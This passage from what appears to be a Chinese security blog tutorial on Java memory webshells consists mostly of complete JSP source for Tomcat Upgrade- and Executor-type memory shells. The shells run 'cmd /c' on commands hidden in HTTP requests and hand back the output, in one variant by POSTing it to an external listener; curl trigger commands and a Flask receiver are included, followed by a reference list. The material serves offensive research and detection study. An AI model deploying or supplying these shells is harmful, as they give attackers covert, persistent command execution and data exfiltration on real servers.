                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
                resp.setCharacterEncoding("GBK");
                resp.doWrite(ByteBuffer.wrap(result));
            } catch (Exception ignored){}
            return false;
        }
    }
%>
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    Field conn = Request.class.getDeclaredField("connector");
    conn.setAccessible(true);
    Connector connector = (Connector) conn.get(req);
    Field proHandler = Connector.class.getDeclaredField("protocolHandler");
    proHandler.setAccessible(true);
    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector);
    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
    upgradeProtocolsField.setAccessible(true);
    upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
    upgradeProtocols.put("hello", new MyUpgrade());
    upgradeProtocolsField.set(handler, upgradeProtocols);
%>
```

启动项目之后执行以下两条命令：

```powershell
curl http://localhost:8080/666.jsp
curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost:8080/666.jsp
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131164918339.png)

## 5.3 Tomcat Executor内存马

由`2.15.2.3`的分析，我们可以写出下面的内存马：

```jsp
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class<?> clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Object getStandardService() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                        return jioEndPoint;
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }

        }
        return new Object();
    }

    class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }

        public void getRequest(Runnable command) {
            try {
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
                byteBuffer.mark();
                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,"socketWrapper");
                socketWrapperBase.read(false,byteBuffer);
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,"socketBufferHandler"),"readBuffer");
                readBuffer.limit(byteBuffer.position());
                readBuffer.mark();
                byteBuffer.limit(byteBuffer.position()).reset();
                readBuffer.put(byteBuffer);
                readBuffer.reset();
                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
                if (a.contains("hacku")) {
                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
                    if (b.length() > 1) {
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process process = rt.exec("cmd /c " + b);
                            java.io.InputStream in = process.getInputStream();
                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                            StringBuilder s = new StringBuilder();
                            String tmp;
                            while ((tmp = stdInput.readLine()) != null) {
                                s.append(tmp);
                            }
                            if (!s.toString().isEmpty()) {
                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
                                getResponse(res);
                            }
                        } catch (IOException ignored) {}
                    }
                }
            } catch (Exception ignored) {}
        }

        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo) tmp_object;
                                        Response response = (Response) getField(getField(request, "req"), "response");
                                        String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());
                                        response.addHeader("Result", result);
                                    }
                                } catch (Exception ignored) {
                                    continue;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        @Override
        public void execute(Runnable command) {
            getRequest(command);
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
%>

<%
    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
    nioEndpoint.setExecutor(exe);
%>
```

关于上面的内存马的分析，请参考下面这篇文章：

> https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ

效果：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202183738506.png)

需要注意的是，原文中的代码没有考虑到命令输出结果中含有中文等字符的情况，所以需要`url`编码，这一点我在上面的代码中已改进。

当然，如果目标条件运行，你也可以利用`yakit`直接外带出来，`jsp`代码如下：

```jsp
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.net.HttpURLConnection" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.util.Arrays" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class<?> clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Object getStandardService() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception ignored) {}
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                        return jioEndPoint;
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }
        }
        return new Object();
    }

    class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }
        
        public void getRequest(Runnable command) {
            try {
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
                byteBuffer.mark();
                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, "socketWrapper");
                socketWrapperBase.read(false, byteBuffer);
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, "socketBufferHandler"), "readBuffer");
                readBuffer.limit(byteBuffer.position());
                readBuffer.mark();
                byteBuffer.limit(byteBuffer.position()).reset();
                readBuffer.put(byteBuffer);
                readBuffer.reset();
                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
                if (a.contains("hacku")) {
                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
                    if (b.length() > 1) {
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process process = rt.exec("cmd /c " + b);
                            java.io.InputStream in = process.getInputStream();
                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                            StringBuilder s = new StringBuilder();
                            String tmp;
                            while ((tmp = stdInput.readLine()) != null) {
                                s.append(tmp);
                            }
                            if (!s.toString().isEmpty()) {
                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
                                getResponse(res);
                            }
                        } catch (IOException ignored) {
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo) tmp_object;
                                        Response response = (Response) getField(getField(request, "req"), "response");
                                        if(sendPostRequest("http://127.0.0.1:8085", res)){
                                            response.addHeader("Result", "success");
                                        } else {
                                            response.addHeader("Result", "failed");
                                        }
                                    }
                                } catch (Exception ignored) {
                                    continue;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        private boolean sendPostRequest(String urlString, byte[] data) {
            try {
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/octet-stream");
                connection.setRequestProperty("Content-Length", String.valueOf(data.length));
                try (OutputStream outputStream = connection.getOutputStream()) {
                    outputStream.write(data);
                    outputStream.flush();
                    int responseCode = connection.getResponseCode();
                    return responseCode == HttpURLConnection.HTTP_OK;
                } catch (Exception ignored){
                    return false;
                }
            } catch (IOException ignored) {
                return false;
            }
        }

        @Override
        public void execute(Runnable command) {
            getRequest(command);
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
%>

<%
    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
    nioEndpoint.setExecutor(exe);
%>
```

先开启监听：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202184234403.png)

然后发送两次数据包，第一次是为了访问`888.jsp`，第二次是为了执行命令：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193456383.png)

可以看到数据已经传输过来了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193525085.png)

当然，用`yakit`自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以`python`自己写一个：

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/postendpoint', methods=['POST'])
def handle_post_request():
    if request.method == 'POST':
        if request.data:
            print("Received data:", request.data.decode())
            return '', 200
        else:
            return 'No data received', 400

if __name__ == '__main__':
    app.run(debug=True)
```

然后修改`jsp`代码中的`url`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194338906.png)

最后效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194418057.png)

# 六、致谢

我在学习Java内存马的过程中阅读参考引用了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出，以表我诚挚的谢意：

```
https://zhuanlan.zhihu.com/p/634697114
https://blog.csdn.net/shelter1234567/article/details/133435490
https://xz.aliyun.com/t/12494
https://xz.aliyun.com/t/7348
https://xz.aliyun.com/t/7388
https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/
https://chenlvtang.top/2022/06/22/Tomcat之Filter内存马/
https://drun1baby.top/2022/08/22/Java内存马系列-03-Tomcat-之-Filter-型内存马/
https://www.jb51.net/article/167204.htm
https://f4de-bak.github.io/pages/10060c/
https://tyaoo.github.io/2021/12/06/Tomcat内存马/
https://github.com/bitterzzZZ/MemoryShellLearn/tree/main
https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew
https://yzddmr6.com/posts/tomcat-context/
https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw
https://gv7.me/articles/2020/kill-java-web-filter-memshell/
https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g
https://xz.aliyun.com/t/9914
https://goodapple.top/archives/1355
https://su18.org/post/memory-shell/
https://nosec.org/home/detail/5049.html
https://su18.org/post/memory-shell/#控制器-拦截器-管道
https://su18.org/post/memory-shell-2/#延伸线程型内存马
https://javasec.org/
https://www.cnblogs.com/javammc/p/15612780.html
https://landgrey.me/blog/12/
https://landgrey.me/blog/19/
https://www.cnblogs.com/zpchcbd/p/15545773.html
https://xz.aliyun.com/t/11039
https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/inject-interceptor-hide-webshell/inject-interceptor-hide-webshell.md
https://www.cnblogs.com/bitterz/p/14859766.html
https://www.javasec.org/javaweb/MemoryShell/
https://www.yongsheng.site/2022/06/18/内存马(二)/
https://segmentfault.com/a/1190000040939157
https://developer.aliyun.com/article/925400
https://su18.org/post/memory-shell/
https://forum.butian.net/share/2593
https://xz.aliyun.com/t/12952
https://www.0kai0.cn/?p=321
https://xz.aliyun.com/t/11331
https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/
https://cloud.tencent.com/developer/article/1888001
https://blog.csdn.net/qq_41048524/article/details/131534948
https://blog.csdn.net/weixin_45505313/article/details/103257933
https://xz.aliyun.com/t/10372
https://www.anquanke.com/post/id/224698
https://forum.butian.net/share/2436
http://124.223.185.138/index.php/archives/28.html
https://longlone.top/安全/java/java安全/内存马/Tomcat-Valve型/
https://su18.org/post/memory-shell/#tomcat-valve-内存马
https://www.freebuf.com/articles/web/344321.html
https://nosec.org/home/detail/5077.html
https://github.com/veo/wsMemShell
https://veo.pub/2022/memshell/
https://tttang.com/archive/1673/
https://www.viewofthai.link/2022/07/20/value型内存马/
https://jiwo.org/ken/detail.php?id=3147
https://paoka1.top/2023/04/24/Tomcat-Agent-型内存马/
https://www.anquanke.com/post/id/225870
https://xz.aliyun.com/t/11988
https://www.cnblogs.com/piaomiaohongchen/p/14992056.html
https://blog.csdn.net/text2204/article/details/129307931
https://xz.aliyun.com/t/13024
https://www.cnblogs.com/coldridgeValley/p/5816414.html
http://wjlshare.com/archives/1541
https://cloud.tencent.com/developer/article/2278400
https://www.freebuf.com/vuls/345119.html
https://tttang.com/archive/1709/
https://xz.aliyun.com/t/11593
https://xz.aliyun.com/t/11613
https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor
https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade
https://github.com/Gh0stF/trojan-eye/tree/master
https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09
https://xz.aliyun.com/t/12949
https://paoka1.top/2023/04/21/Tomcat-WebSocket-型内存马/
https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ
```

